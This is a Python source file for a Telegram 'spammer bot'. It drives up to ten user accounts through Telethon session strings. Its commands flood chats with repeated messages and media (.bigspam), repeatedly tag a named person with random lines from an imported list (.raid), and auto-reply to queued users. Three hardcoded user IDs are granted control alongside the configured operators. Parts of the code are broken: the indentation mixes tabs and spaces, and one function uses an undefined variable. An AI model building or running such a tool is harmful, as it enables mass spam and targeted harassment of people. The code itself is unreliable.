###########
###########
###########
###########
import asyncio
import os
import random
import sys
from datetime import datetime
import telethon.utils
from telethon import TelegramClient, events
from telethon.errors import (
    ChannelInvalidError,
    ChannelPrivateError,
    ChannelPublicGroupNaError,
)
from telethon.sessions import StringSession
from telethon.tl import functions, types
from telethon.tl.functions.channels import GetFullChannelRequest, LeaveChannelRequest
from telethon.tl.functions.messages import GetFullChatRequest, ImportChatInviteRequest
from Config import (
    API_HASH,
    API_ID,
    STRING,
    STRING2,
    STRING3,
    STRING4,
    STRING5,
    STRING6,
    STRING7,
    STRING8,
    STRING9,
    STRING_10,
    SUDO_USERS,
)
from Utils import RAID, RRAID
###########
###########
###########      
###########
a = API_ID
b = API_HASH
smex = STRING
smexx = STRING2
smexxx = STRING3
smexxxx = STRING4
smexxxxx = STRING5
sixth = STRING6
seven = STRING7
eight = STRING8
ninth = STRING9
tenth = STRING_10
###########
###########
###########      
###########
omp = ""
omp2 = ""
omp3 = ""
omp4 = ""
omp5 = ""
omp6 = ""
omp7 = ""
omp8 = ""
omp9 = ""
omp10 = ""
###########
###########
###########      
###########
que = {}
###########
###########
###########      
###########
SMEX_USERS = [658876201, 2092103173, 5138767016]
for x in SUDO_USERS:
    SMEX_USERS.append(x)
###########
###########
###########      
###########
async def start_Vansh():
    global omp
    global omp2
    global omp3
    global omp4
    global omp5
    global omp6
    global omp7
    global omp8
    global omp9
    global omp10
###########
###########      
###########
###########   
    if smex:
    	session_name = str(smex)
        print("String 1 Found")
        omp = TelegramClient(StringSession(session_name), a, b)
        try:
        	print("Booting Up The Client 1")
            await omp.start()
            botme = await omp.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            omp = "smex"
            print(e)
    else:
        print("Session 1 not Found")
        session_name = "RoodxPunjabi"
        omp = TelegramClient(session_name, a, b)
        try:
            await omp.start()
        except Exception:
            pass
###########
###########
###########      
###########
    if smexx:
        session_name = str(smexx)
        print("String 2 Found")
        omp2 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 2")
            await omp2.start()
            botme = await omp2.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    else:
        print("Session 2 not Found")
        session_name = "RoodxPunjabi"
        omp2 = TelegramClient(session_name, a, b)
        try:
            await omp2.start()
        except Exception:
            pass
###########
###########
###########      
###########
    if smexxx:
        session_name = str(smexxx)
        print("String 3 Found")
        omp3 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 3")
            await omp3.start()
            botme = await omp3.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    else:
        print("Session 3 not Found")
        session_name = "startup"
        omp3 = TelegramClient(session_name, a, b)
        try:
            await omp3.start()
        except Exception:
            pass
###########
###########
###########      
###########
    if smexxxx:
        session_name = str(smexxxx)
        print("String 4 Found")
        omp4 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 4")
            await omp4.start()
            botme = await omp4.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    else:
        print("Session 4 not Found")
        session_name = "startup"
        omp4 = TelegramClient(session_name, a, b)
        try:
            await omp4.start()
        except Exception:
            pass
###########
###########
###########      
###########
    if smexxxxx:
        session_name = str(smexxxxx)
        print("String 5 Found")
        omp5 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 5")
            await omp5.start()
            botme = await omp5.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    else:
        print("Session 5 not Found")
        session_name = "startup"
        omp5 = TelegramClient(session_name, a, b)
        try:
            await omp5.start()
        except Exception:
            pass
###########
###########
###########      
###########
    if sixth:
        session_name = str(sixth)
        print("String 6 Found")
        omp6 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 6")
            await omp6.start()
            botme = await omp6.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    else:
        print("Session 6 not Found")
        session_name = "startup"
        omp6 = TelegramClient(session_name, a, b)
        try:
            await omp6.start()
        except Exception:
            pass
###########
###########
###########      
###########
    if seven:
        session_name = str(seven)
        print("String 7 Found")
        omp7 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 7")
            await omp7.start()
            botme = await omp7.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    else:
        print("Session 7 not Found")
        session_name = "startup"
        omp7 = TelegramClient(session_name, a, b)
        try:
            await omp7.start()
        except Exception:
            pass
###########
###########
###########      
###########
    if eight:
        session_name = str(eight)
        print("String 8 Found")
        omp8 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 8")
            await omp8.start()
            botme = await omp8.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    else:
        print("Session 8 not Found")
        session_name = "startup"
        omp8 = TelegramClient(session_name, a, b)
        try:
            await omp8.start()
        except Exception:
            pass
###########
###########
###########      
###########
    if ninth:
        session_name = str(ninth)
        print("String 9 Found")
        omp9 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 9")
            await omp9.start()
            botme = await omp9.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    else:
        print("Session 9 not Found")
        session_name = "startup"
        omp9 = TelegramClient(session_name, a, b)
        try:
            await omp9.start()
        except Exception:
            pass
###########
###########
###########      
###########
    if tenth:
        session_name = str(tenth)
        print("String 10 Found")
        omp10 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 10")
            await omp10.start()
            botme = await omp10.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    else:
        print("Session 10 not Found")
        session_name = "startup"
        omp10 = TelegramClient(session_name, a, b)
        try:
            await omp10.start()
        except Exception:
            pass
###########
###########
###########      
###########
loop = asyncio.get_event_loop()
loop.run_until_complete(start_Vansh())
async def gifspam(e, smex):
    try:
        await e.client(
            functions.messages.SaveGifRequest(
                id=types.InputDocument(
                    id=sandy.media.document.id,
                    access_hash=smex.media.document.access_hash,
                    file_reference=smex.media.document.file_reference,
                ),
                unsave=True,
            )
        )
    except Exception:
        pass
###########
###########
###########
###########
@omp.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@omp2.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@omp3.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@omp4.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@omp5.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@omp6.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@omp7.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@omp8.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@omp9.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@omp10.on(events.NewMessage(incoming=True, pattern=r"\.join"))
async def _(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.join <Public Channel or Group Link/Username>"
    if e.sender_id in SMEX_USERS:
        Vansh = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 6:
            bc = Vansh[0]
            text = "J𝙾𝙸𝙽𝙸𝙽𝙶..."
            event = await e.reply(text, parse_mode=None, link_preview=None)
            try:
                await e.client(functions.channels.JoinChannelRequest(channel=bc))
                await event.edit("𝚂𝚄𝙲𝙲𝙴𝚂𝙵𝚄𝙻𝙻𝚈 𝙹𝙾𝙸𝙽𝙴𝙳 !!!\n••••[×]   〄 **╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝** SᑭᗩᗰᗰEᖇ ᗷOT 〄")
            except Exception as e:
                await event.edit(str(e))
        else:
            await e.reply(usage, parse_mode=None, link_preview=None)
###########
###########
###########
###########
@omp.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@omp2.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@omp3.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@omp4.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@omp5.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@omp6.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@omp7.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@omp8.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@omp9.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@omp10.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
async def alive(e):
    if e.sender_id in SMEX_USERS:
        start = datetime.now()
        rkoh = "Cheaking..."
        event = await e.reply(rkoh, parse_mode=None, link_preview=None)
        end = datetime.now()
        ms = (end - start).microseconds / 1000
        await event.edit(f"🤖 I Am Still alive Lomdike !!!!\n`{ms}` 𝗺𝘀\n    〄 **╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝** SᑭᗩᗰᗰEᖇ ᗷOT 〄")
###########
###########
###########
###########
@omp.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@omp2.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@omp3.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@omp4.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@omp5.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@omp6.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@omp7.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@omp8.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@omp9.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@omp10.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
async def _(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.pjoin <Private Channel or Group's access hash>\n\nExample :\nLink = https://t.me/joinchat/HGYs1wvsPUplMmM1\n\n.pjoin HGYs1wvsPUplMmM1"
    if e.sender_id in SMEX_USERS:
        Vansh = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 7:
            bc = Vansh[0]
            text = "J𝙾𝙸𝙽𝙸𝙽𝙶..."
            event = await e.reply(text, parse_mode=None, link_preview=None)
            try:
                await e.client(ImportChatInviteRequest(bc))
                await event.edit("S𝚄𝙲𝙲𝙴𝚂𝙵𝚄𝙻𝙻𝚈 J𝙾𝙸𝙽𝙴𝙳 !!!\n••••[×]   〄 **╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝** SᑭᗩᗰᗰEᖇ ᗷOT 〄")
            except Exception as e:
                await event.edit(str(e))
        else:
            await e.reply(usage, parse_mode=None, link_preview=None)
###########
###########
###########
###########
@omp.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@omp2.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@omp3.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@omp4.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@omp5.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@omp6.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@omp7.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@omp8.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@omp9.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@omp10.on(events.NewMessage(incoming=True, pattern=r"\.leave"))        
async def _(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗟𝗲𝗮𝘃𝗲\n\nCommand:\n\n.leave <Channel or Chat ID>"
    if e.sender_id in SMEX_USERS:
        jatt = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 7:
            bc = jatt[0]
            bc = int(bc)
            text = "Leaving....."
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await event.client(LeaveChannelRequest(bc))
                await event.edit("Succesfully Left")
            except Exception as e:
                await event.edit(str(e))   
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
###########
###########
###########
###########
@omp.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@omp2.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@omp3.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@omp4.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@omp5.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@omp6.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@omp7.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@omp8.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@omp9.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@omp10.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
async def spam(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗕𝗶𝗴𝗦𝗽𝗮𝗺\n\nCommand:\n\n.bigspam <count> <message to spam>\n\n.bigspam <count> <reply to a message>\n\nCount must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None)
        Vansh = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(Vansh) == 2:
            message = str(Vansh[1])
            counter = int(Vansh[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "typing"):
                    if e.reply_to_msg_id:
                        await smex.reply(message)
                    else:
                        await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(0.0)
        elif e.reply_to_msg_id and smex.media:
            counter = int(Vansh[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "document"):
                    smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
                    await gifspam(e, smex)
                await asyncio.sleep(0.0)
        elif e.reply_to_msg_id and smex.text:
            message = smex.text
            counter = int(Vansh[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(0.0)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None)
###########
###########
###########
###########
@omp.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@omp2.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@omp3.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@omp4.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@omp5.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@omp6.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@omp7.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@omp8.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@omp9.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@omp10.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
async def spam(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗥𝗮𝗶𝗱\n\nCommand:\n\n.raid <count> <Username of User>\n\n.raid <count> <reply to a User>\n\nCount must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None)
        Vansh = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        await e.get_reply_message()
        if len(Vansh) == 2:
            message = str(Vansh[1])
            print(message)
            a = await e.client.get_entity(message)
            g = a.id
            c = a.first_name
            username = f"[{c}](tg://user?id={g})"
            counter = int(Vansh[0])
            for _ in range(counter):
                reply = random.choice(RAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.0)
        elif e.reply_to_msg_id:
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            c = b.first_name
            counter = int(Vansh[0])
            username = f"[{c}](tg://user?id={g})"
            for _ in range(counter):
                reply = random.choice(RAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.0)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None)
###########
###########
###########
###########
@omp.on(events.NewMessage(incoming=True))
@omp2.on(events.NewMessage(incoming=True))
@omp3.on(events.NewMessage(incoming=True))
@omp4.on(events.NewMessage(incoming=True))
@omp5.on(events.NewMessage(incoming=True))
@omp6.on(events.NewMessage(incoming=True))
@omp7.on(events.NewMessage(incoming=True))
@omp8.on(events.NewMessage(incoming=True))
@omp9.on(events.NewMessage(incoming=True))
@omp10.on(events.NewMessage(incoming=True))
async def _(event):
    global que
    queue = que.get(event.sender_id)
    if not queue:
        return
    async with event.client.action(event.chat_id, "typing"):
        await asyncio.sleep(0.0)
    async with event.client.action(event.chat_id, "typing"):
        await event.client.send_message(
            entity=event.chat_id,
            message="""{}""".format(random.choice(RRAID)),
            reply_to=event.message.id,
        )
###########
###########
###########
###########
@omp.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@omp2.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@omp3.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@omp4.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@omp5.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@omp6.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@omp7.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@omp8.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@omp9.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@omp10.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
async def ping(e):
    if e.sender_id in SMEX_USERS:
        start = datetime.now()
        rkoh = "Cheaking..."
        event = await e.reply(rkoh, parse_mode=None, link_preview=None)
        end = datetime.now()
        ms = (end - start).microseconds / 1000
        await event.edit(f"🤖 I Am Still alive Lomdike !!!!\n`{ms}` 𝗺𝘀\n    〄 **╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝** SᑭᗩᗰᗰEᖇ ᗷOT 〄")
###########
###########
###########
###########
@omp.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@omp2.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@omp3.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@omp4.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@omp5.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@omp6.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@omp7.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@omp8.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@omp9.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@omp10.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
async def restart(e):
    if e.sender_id in SMEX_USERS:
        text = "[ R E S T A R T I N G ]\n\nPlease wait till it reboots..."
        await e.reply(text, parse_mode=None, link_preview=None)
        try:
            await omp.disconnect()
        except Exception:
            pass
        try:
            await omp2.disconnect()
        except Exception:
            pass
        try:
            await omp3.disconnect()
        except Exception:
            pass
        try:
            await omp4.disconnect()
        except Exception:
            pass
        try:
            await omp5.disconnect()
        except Exception:
            pass
        try:
            await omp6.disconnect()
        except Exception:
            pass
        try:
            await omp7.disconnect()
        except Exception:
            pass
        try:
            await omp8.disconnect()
        except Exception:
            pass
        try:
            await omp10.disconnect()
        except Exception:
            pass
        try:
            await omp9.disconnect()
        except Exception:
            pass
        os.execl(sys.executable, sys.executable, *sys.argv)
        quit()
###########
###########
###########
###########
@omp.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@omp2.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@omp3.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@omp4.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@omp5.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@omp6.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@omp7.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@omp8.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@omp9.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@omp10.on(events.NewMessage(incoming=True, pattern=r"\.help"))
async def help(e):
    if e.sender_id in SMEX_USERS:
       text = "🔥 ᏟϴᎷᎷᎪΝᎠՏ 🔥\n\n༒ᏢᏆΝᏀ\n༒ᎡᎬՏͲᎪᎡͲ\n༒ᎫϴᏆΝ\n༒ᏞᎬᎪᏙᎬ\n༒ᏢᎫϴᏆΝ\n༒ᏴᏆᏀՏᏢᎪᎷ\n༒ᎡᎪᏆᎠ\n༒ᎡᎬᏢᏞᎽᎡᎪᏆᎠ\n༒ᎪᏞᏆᏙᎬ"
       await e.reply(text, parse_mode=None, link_preview=None )
###########
###########
###########
###########
@omp.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
@omp2.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
@omp3.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
@omp4.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
@omp5.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
@omp6.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
@omp7.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
@omp8.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
@omp9.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
@omp10.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
async def repo(e):
    if e.sender_id in SMEX_USERS:
       text = "〄 ╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝ SᑭᗩᗰᗰEᖇ ᗷOT 〄\n┏━━━━━━━━━━━━━━━━━━━\n┣➣ Sᴜᴘᴘᴏʀᴛ : [ᒍOIᑎ] @TeamRoodChat\n┣➣ Cʀᴇᴀᴛᴇʀ : [ᖇOOᗪ OᗯᑎEᖇ] @Rood_Gamer_Owner)\n┣➣ Rᴇᴩᴏ : [TYᑭE] OC PRIVATE\n┗━━━━━━━━━━━━━━━━━━━"
       await e.reply(text, parse_mode=None, link_preview=None )
###########
###########
###########
###########
text = """CONGO SPAMBOT SUCCESSFULLY BUILD"""
###########
###########
###########
###########
print(text)
print("")
print("DONE! 〄 ╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝ SᑭᗩᗰᗰEᖇ ᗷOT 〄 STARTED.\nNOW ADD YOUR SPAMMERBOT IN ONE GROUP THEM TYPE .alive With Sudo Account")
###########
###########
###########      
###########
if len(sys.argv) not in (1, 3, 4):
    try:
        omp.disconnect()
    except Exception:
        pass
    try:
        omp2.disconnect()
    except Exception:
        pass
    try:
        omp3.disconnect()
    except Exception:
        pass
    try:
        omp4.disconnect()
    except Exception:
        pass
    try:
        omp5.disconnect()
    except Exception:
        pass
    try:
        omp6.disconnect()
    except Exception:
        pass
    try:
        omp7.disconnect()
    except Exception:
        pass
    try:
        omp8.disconnect()
    except Exception:
        pass
    try:
        omp9.disconnect()
    except Exception:
        pass
    try:
        omp10.disconnect()
    except Exception:
        pass
else:
    try:
        omp.run_until_disconnected()
    except Exception:
        pass
    try:
        omp2.run_until_disconnected()
    except Exception:
        pass
    try:
        omp3.run_until_disconnected()
    except Exception:
        pass
    try:
        omp4.run_until_disconnected()
    except Exception:
        pass
    try:
        omp5.run_until_disconnected()
    except Exception:
        pass
    try:
        omp6.run_until_disconnected()
    except Exception:
        pass
    try:
        omp7.run_until_disconnected()
    except Exception:
        pass
    try:
        omp8.run_until_disconnected()
    except Exception:
        pass
    try:
        omp9.run_until_disconnected()
    except Exception:
        pass
    try:
        omp10.run_until_disconnected()
    except Exception:
        pass
###########
###########
###########      
###########
